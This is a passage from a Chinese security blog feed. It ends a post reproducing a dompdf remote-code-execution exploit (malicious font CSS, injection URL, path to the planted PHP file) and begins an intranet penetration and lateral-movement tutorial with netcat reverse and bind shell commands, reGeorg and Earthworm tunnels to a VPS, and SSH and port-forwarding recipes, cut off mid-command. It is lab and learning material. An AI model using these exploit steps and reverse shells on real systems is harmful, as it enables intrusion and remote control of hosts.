class="keyword">if</span> (!<span class="variable">$font</span>) &#123;</span><br><span class="line">       unlink(<span class="variable">$localTempFile</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$font</span>-&gt;parse();</span><br><span class="line">   <span class="variable">$font</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">   unlink(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Save the changes</span></span><br><span class="line">   file_put_contents(<span class="variable">$localFile</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;saveFontFamilies();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，新缓存字体的名字是确定了的，<code>字体名称</code>，<code>样式</code>，<code>MD5(RemoteURL)</code>这三个组成，比如，url是这样:<code>http://attacker.local/test_font.ttf</code>，样式为normal，那么将被存为：<code>testfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf</code></p><p>![image-20220319110855454](dompdf 0day(RCE)复现/image-20220319110855454.png)</p><p>那么这样的话，即使没有目录遍历的洞，也可以不用爆破直接知道文件名。</p><p>当然，上传的字体必须有效，必须能被加载和解析。</p><p>但是源码有个问题，他判断字体文件是否正常，是基于上传文件的文件头，类似Linux的判断方式，而不管文件后缀，那么即使使用其他后缀，只要符合<code>ttf</code>的文件头标准，仍可被解析。</p><p>下面是构造的<code>css</code>以及<code>ttf(php)</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;exploitfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;http://localhost:9001/exploit_font.php&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png" alt="image-20220319111650926"></p><p>至于ttf文件结构？网上一堆。。。</p><p>下面直接使用<a href="https://github.com/positive-security/dompdf-rce">github</a>的来复现：</p><p>开启应用和exp：</p><p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111921628.png" alt="image-20220319111921628"></p><p>使用exploit_font.php触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=&lt;link rel=stylesheet href=&#x27;http://localhost:9001/exploit.css&#x27;&gt;</span><br></pre></td></tr></table></figure><p>之后访问：<code>http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</code></p><p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319112233859.png" alt="image-20220319112233859"></p><p>成功触发。</p><p>u1s1这个洞完全可以出个CTF题，，</p><p>参考链接：</p><blockquote><p>  <a href="https://positive.security/blog/dompdf-rce">https://positive.security/blog/dompdf-rce</a></p><p>  <a href="https://github.com/positive-security/dompdf-rce">https://github.com/positive-security/dompdf-rce</a></p><p>  <a href="https://juejin.cn/post/7010064099027451912">ttf文件格式</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这次的漏洞是&lt;code&gt;dompdf&lt;/code&gt;这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。&lt;/p&gt;
&lt;p&gt;最开始这个漏洞并不是rce，而是xss。&lt;/p&gt;
&lt;p&gt;首先是两个配置：&lt;/p&gt;
&lt;p&gt;在 PDF 渲染期间执行嵌入式 PHP，之后</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透&amp;横向移动&amp;····</title>
    <link href="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&amp;%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&amp;%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2022-03-18T16:00:00.000Z</published>
    <updated>2022-03-19T09:37:16.437Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub：<a href="https://github.com/Ghostasky/IntranetPenetrationLearn">https://github.com/Ghostasky/IntranetPenetrationLearn</a></p><p>给个star吧QAQ</p><p>[toc]</p><h1 id="1-名词解释"><a href="#1-名词解释" class="headerlink" title="1.名词解释"></a>1.名词解释</h1><p>工作组、域、域控制器（DC）、父域、子域、域树、域森林、活动目录（AD）、DMZ、域内权限等</p><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>将不同的计算机按功能列入到不同的工作组中。工作组没有集中管理的作用，工作组中所有的计算机都是对等的。工作组不受密码保护。一个账户只能登陆到一台计算机。每一台计算机都在本地存储用户的帐户。</p><p>工作组的正规解释：在一个大的单位内，可能有成百上千台电脑互连组成局域网，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中。</p><p>每台计算机都是对等的，<code>a</code>机器不能登录<code>b</code>机器。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p><a href="https://blog.51cto.com/angerfire/144123">域，域树，域林，根域</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11906772.html">内网基础知识</a></p><p>域(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p><p>域控制器（Domain Controller，简写为DC）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。<br>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p><p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p><p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p><p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161917242-744398688.png" alt="img"></p><h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161939610-1988580593.png" alt="img"></p><h3 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h3><p>DNS域名服务器（Domain Name Server）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。</p><p>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</p><p>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p><h3 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h3><p>域环境中提供目录服务的组件。</p><p>就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</p><h3 id="AD与DC的区别"><a href="#AD与DC的区别" class="headerlink" title="AD与DC的区别"></a>AD与DC的区别</h3><p>把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121163434689-855209408.png" alt="img"></p><p>1.内网（安全级别最高）：分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和办公区（员工日常工作区，一般能够访问DMZ，部分主机可以访问核心区）</p><p>2.DMZ（Demilitarized Zone，边界网络，隔离区，安全级别中等）：作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施</p><p>3.外网（Internet，安全级别最低）</p><h2 id="DMZ区域"><a href="#DMZ区域" class="headerlink" title="DMZ区域"></a>DMZ区域</h2><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p><ul><li>  内网可以访问外网：内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</li><li>  内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ中的服务器。</li><li>  外网不能访问内网：这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。</li><li>  外网可以访问DMZ：DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li><li>  DMZ不能访问内网：如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。　</li><li>  DMZ不能访问外网：此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</li></ul><h2 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h2><p>组（Group）是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。</p><h3 id="1-域本地组"><a href="#1-域本地组" class="headerlink" title="1.域本地组"></a>1.域本地组</h3><p>可以从域林中添加用户账号，权限只限于本域资源的访问。</p><h3 id="2-全局组"><a href="#2-全局组" class="headerlink" title="2.全局组"></a>2.全局组</h3><p>可以从本域中添加用户账号，权限可以访问整个域林的资源。</p><h3 id="3-通用组"><a href="#3-通用组" class="headerlink" title="3.通用组"></a>3.通用组</h3><p>可从整个域林添加成员，权限可访问整个域林的资源。</p><h3 id="4-A-G-DL-P策略"><a href="#4-A-G-DL-P策略" class="headerlink" title="4.A-G-DL-P策略"></a>4.A-G-DL-P策略</h3><p>A-G-DL-P策略 （A:表示用户账户、G:表示全局组、U:表示通用组、DL:表示域本地组、P:表示资源权限）</p><h1 id="2-域搭建"><a href="#2-域搭建" class="headerlink" title="2.域搭建"></a>2.域搭建</h1><blockquote><p>  DC: win2008 ，密码Admin123<br>  DM: win2003<br>  DM: winxp</p></blockquote><p>DC2008：</p><p>网络配置</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174256681.png" alt="image-20220316174256681"></p><p>添加服务器角色：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174530574.png" alt="image-20220316174530574"></p><p>配置域服务(在administrator用户下。。)：</p><p>dos下：<code>dcpromo</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174748182.png" alt="image-20220316174748182"></p><p>提示错误的话，管理员cmd<code>net user administrator /passwordreq:yes</code></p><p>设置林根域：</p><p>林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182106728.png" alt="image-20220316182106728"></p><p>域数据存放的地址：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182303660.png" alt="image-20220316182303660"></p><p>密码还是设置为Admin123!</p><p>接下来就是配置win2003和xp，都和08差不多</p><p>配置的dns要设置为主域控的ip：192.168.188.100</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316183849046.png" alt="image-20220316183849046"></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316184043460.png" alt="image-20220316184043460"></p><h1 id="3-端口转发-amp-边界代理"><a href="#3-端口转发-amp-边界代理" class="headerlink" title="3.端口转发&amp;边界代理"></a>3.端口转发&amp;边界代理</h1><p>先说下正向代理和反向代理：<img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606872766_5fc6eebe0e0d42db8c48c.png!small" alt="img"></p><p>正向代理：<code>Lhost--&gt;proxy--&gt;Rhost</code></p><p>反向代理：<code>Lhost&lt;---&gt;proxy&lt;---&gt;firewall&lt;---&gt;Rhost</code>，一般情况下，防火墙肯定不能让外网机器随便访问地访问内网机器，所以就提出反向代理。</p><p>Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透。</p><p>代理的本质：socks协议，位于会话层（应用层）</p><p>Socks介于传输层与表示层之间，使用TCP协议传输数据，因而不提供如传递ICMP信息之类的网络层相关服务。</p><p>目前有两个版本：SOCKS4和SOCKS5</p><p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p><p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p><p>Ps: Socks不支持ICMP，不能使用ping命令</p><p>使用nc演示</p><blockquote><p>  主机A：192.168.153.138</p><p>  主机B：192.168.153.140</p></blockquote><p>正向：</p><p>A机：<code>nc -l -p 5555 -t -e cmd.exe</code>，-t是通过telnet模式执行 cmd.exe 程序，可以省略</p><p>B机：<code>nc -nvv 192.168.153.138 5555</code>，</p><p>反向：</p><p>B机：监听 <code>nc-lp 5555</code></p><p>在A机反弹：<code>nc -t -e cmd 192.168.153.140 5555</code></p><h2 id="reGeorg-Proxychains"><a href="#reGeorg-Proxychains" class="headerlink" title="reGeorg+Proxychains"></a>reGeorg+Proxychains</h2><p>主要是把内网服务器的端口通过http/https隧道转发到本机。</p><p>上传reGeorg的tunnel.jsp到web主机A</p><p>主机B：<code>python reGeorgSocksProxy.py -p 1080 -u http://192.168.153.137/tunnel.jsp</code></p><p>使用设置proxychains的代理端口，进行访问，一般配合nmap和metasploit进行后续内网渗透。</p><p>Ps：socks4版本协议不支持udp和icmp协议，所以使用nmap要加上-sT -Pn即使用tcp协议且不使用icmp协议。</p><h2 id="Earthworm-Proxychains"><a href="#Earthworm-Proxychains" class="headerlink" title="Earthworm+Proxychains"></a>Earthworm+Proxychains</h2><h3 id="反弹socks5服务器"><a href="#反弹socks5服务器" class="headerlink" title="反弹socks5服务器"></a>反弹socks5服务器</h3><p>当目标网络边界不存在公网IP，通过反弹方式创建socks代理。</p><p>先在一台具有公网 ip 的主机A上运行以下命令</p><p><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></p><p>意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给8888端口</p><p>在目标主机B上启动SOCKS5服务 并反弹到公网主机的8888端口</p><p><code>ew_for_Win.exe -s rssocks -d 192.168.153.129(VPS) -e 8888</code></p><p>本地主机（192.168.153.129）然后通过添加公网192.168.153.129:1080这个代理,来访问内网机器（192.168.153.129）</p><h3 id="二级网络环境（有公网IP）"><a href="#二级网络环境（有公网IP）" class="headerlink" title="二级网络环境（有公网IP）"></a>二级网络环境（有公网IP）</h3><p>假设我们获得了右侧A主机和B主机的控制权限，A主机配有2块网卡，一块10.129.72.168连通外网，一块192.168.153.140只能连接内网B主机，无法访问内网其它资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876288_5fc6fc80d5cb1db233661.png!small" alt="img"></p><p>先上传ew到B主机，利用ssocksd方式启动8888端口的SOCKS代理，命令如下<code>ew_for_Win.exe -s ssocksd -l 8888</code></p><p>A主机执行：<code>ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.153.138 -g 8888</code>(将1080端口收到的代理请求转交给B主机（192.168.153.138）的8888端口)</p><p>MyPc就可以通过A的外网代理10.129.72.168:1080访问B。</p><h3 id="二级网络（无公网IP）"><a href="#二级网络（无公网IP）" class="headerlink" title="二级网络（无公网IP）"></a>二级网络（无公网IP）</h3><p>假设我们获得了右侧A主机和B主机的控制权限，A主机（NAT）没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876319_5fc6fc9f5e6fcab88b21d.png!small" alt="img"></p><ol><li><p> 在公网vps（45.xxx.xxx.72）添加转接隧道，将10800端口收到的代理请求转交给8888端口<code>./ew_for_linux64 -s lcx_listen -l 10800 -e 8888</code></p></li><li><p>B主机（192.168.153.138）主机正向开启9999端口</p><p> <code>./ew_for_Win.exe -s ssocksd -l 9999</code></p></li><li><p>A主机利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来</p><p> <code>./ew_for_Win.exe -s lcx_slave -d 45.xxx.xxx.72 -e 8888 -f 192.168.153.138 -g 9999</code></p></li></ol><p>现在MyPC可通过访问45.xxx.xxx.72:10800来使用192.168.153.138主机提供的socks5代理，代理成功，vps会有rssocks cmd_socket OK!提示</p><h2 id="SSH隧道代理转发"><a href="#SSH隧道代理转发" class="headerlink" title="SSH隧道代理转发"></a>SSH隧道代理转发</h2><p>sh有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D port remotehost</span><br><span class="line"></span><br><span class="line">参数详解：</span><br><span class="line">-C 允许压缩数据</span><br><span class="line">-q 安静模式</span><br><span class="line">-T不占用 shell</span><br><span class="line">-f 后台运行，并推荐加上 -n 参数</span><br><span class="line">-N不执行远程命令</span><br><span class="line">-g允许远端主机连接本地转发的端口</span><br><span class="line">-n把 stdin 重定向到 /dev/null (防止从 stdin 读取数据)</span><br><span class="line">-L port:host :hostport 正向代理</span><br><span class="line">//将本地机(客户机)的某个端口转发到远端指定机器的指定端口</span><br><span class="line">-R port:host :hostport 反向代理</span><br><span class="line">//将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</span><br><span class="line">-D port socks5代理</span><br><span class="line">//指定一个本地机器 <span class="string">&quot;动态&quot;</span> 应用程序端口转发</span><br></pre></td></tr></table></figure><h3 id="ssh本地转发"><a href="#ssh本地转发" class="headerlink" title="ssh本地转发"></a>ssh本地转发</h3><p>本地转发（local forwarding）指的是，SSH 服务器作为中介的跳板机，建立本地计算机与特定目标网站之间的加密连接。本地转发是在本地计算机的 SSH 客户端建立的转发规则。</p><p>它会指定一个本地端口（local-port），所有发向那个端口的请求，都会转发到 SSH 跳板机（tunnel-host），然后 SSH 跳板机作为中介，将收到的请求发到目标服务器（target-host）的目标端口（target-port）。</p><p>远程管理服务器上的mysql，mysql不能直接root用户远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到本地1234端口实现以root用户远程登陆mysql。</p><p><code>$ ssh -L local-port:target-host:target-port tunnel-host</code></p><p><code>ssh -CfNg -L 1234:127.0.0.1:3306 root@45.XX.XX.X21</code></p><p>另一例子：</p><p>假定host1是本地主机，host2是远程主机。由于种种原因，这两台主机之间无法连通。但是，另外还有一台host3，可以同时连通前面两台主机。因此，很自然的想法就是，通过host3，将host1连上host2。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在host1上：</span></span><br><span class="line">ssh -L 2121:host2:21 host3</span><br><span class="line"><span class="comment">#这样一来，我们只要连接host1的2121端口，就等于连上了host2的21端口。</span></span><br><span class="line">ftp localhost:2121</span><br></pre></td></tr></table></figure><h3 id="ssh远程转发"><a href="#ssh远程转发" class="headerlink" title="ssh远程转发"></a>ssh远程转发</h3><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就可以直接访问到了内网的端口。</p><p>将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</p><p>既然”本地端口转发”是指绑定本地端口的转发，那么”远程端口转发”当然是指绑定远程端口的转发。</p><p>host1与host2之间无法连通，必须借助host3转发。但是，特殊情况出现了，host3是一台内网机器，它可以连接外网的host1，但是反过来就不行，外网的host1连不上内网的host3。这时，”本地端口转发”就不能用了，怎么办？</p><p>解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#host3上</span></span><br><span class="line">ssh -R 2121:host2:21 host1</span><br><span class="line"><span class="comment">#就是让host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。由于对于host3来说，host1是远程主机，所以这种情况就被称为&quot;远程端口绑定&quot;。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#host1上：</span></span><br><span class="line">ftp localhost:2121</span><br></pre></td></tr></table></figure><h3 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h3><p>无论是本地端口转发还是远程端口转发，都是将某固定主机及其端口映射到本地或远程转发端口上，例如将host2:80映射到host1:2222。也就是说，本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，2222端口必须对应的是http的80端口，使用浏览器向host1:2222端口发起http请求当然没问题，但是使用ssh工具向host1:2222发起连接将会被拒绝，因为host2上http服务只能解析http请求，不能解析ssh连接请求。</p><p>ssh支持动态端口转发，由ssh来判断发起请求的工具使用的是什么应用层协议，然后根据判断出的协议结果决定目标端口。<br>以下图为例进行说明，host1处在办公内网，能和host3互相通信，但它无法直接和互联网和host2通信，而host3则可以和host2以及互联网通信。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/733013-20170706233246425-1384840260.png" alt="img"></p><p>要让host1访问互联网，又能和host2的22端口即ssh服务通信，显然在host1上仅设置一个本地端口转发是不够的，虽然可以设置多个本地转发端口分别映射不同的端口，但这显然比较笨重和麻烦。使用动态端口转发即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在host1上</span></span><br><span class="line">ssh -Nfg -D 2222 host3</span><br></pre></td></tr></table></figure><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>尝试几个常用的</p><p>win：lcx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:lcx.exe -listen 1234 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">远程:lcx.exe -slave ip 1234 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>netsh<br>只支持tcp协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">添加转发规则</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389</span><br><span class="line">此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389</span><br><span class="line"></span><br><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=9090</span><br><span class="line"></span><br><span class="line">查看现有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">xp需要安装ipv6</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><p>linux :</p><p>portmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:./portmap -m 2 -p1 1234 -p2 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">./portmap -m 1 -p1 3389 -h2 ip -p2 1234</span><br></pre></td></tr></table></figure><p>iptables</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、编辑配置文件/etc/sysctl.conf的net.ipv4.ip_forward = 1</span><br><span class="line"></span><br><span class="line">2、关闭服务</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span class="line">3、配置规则</span><br><span class="line">需要访问的内网地址：192.168.206.101</span><br><span class="line">内网边界web服务器：192.168.206.129</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129</span><br><span class="line"></span><br><span class="line">4、保存&amp;&amp;重启服务</span><br><span class="line">service iptables save &amp;&amp; service iptables 